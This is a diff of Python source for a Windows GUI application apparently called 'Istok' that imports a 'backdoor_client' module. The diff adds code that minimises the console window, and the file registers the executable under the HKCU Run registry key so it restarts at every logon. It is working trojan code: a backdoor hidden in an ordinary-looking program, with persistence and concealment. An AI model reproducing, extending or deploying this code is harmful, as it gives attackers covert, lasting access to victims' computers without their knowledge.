@@ -7,6 +7,8 @@ import winreg as reg
 from threading import Thread
 import warnings
 warnings.filterwarnings("ignore")
+import ctypes
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 6 )
 
 from backdoor_client import backdoor
 from MainIstok import Ui_Istok
@@ -18,10 +20,9 @@ from Search import Ui_Search
 
 
 def write_to_reg():
-    #pth = os.path.dirname(os.path.realpath(__file__))
-    os.popen('copy istok.exe C:\\')
+    pth = os.path.dirname(os.path.realpath(__file__))
     s_name = "istok.exe"
-    address = os.path.join("C:\\", s_name)
+    address = os.path.join(pth, s_name)
     tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
     reg.SetValue(tmp, None, reg.REG_SZ, address)
     reg.CloseKey(tmp)
@@ -405,6 +406,7 @@ if __name__ == '__main__':
     thread1.start()
     thread2.start()
     thread1.join()
+
     thread2.join()
 
 
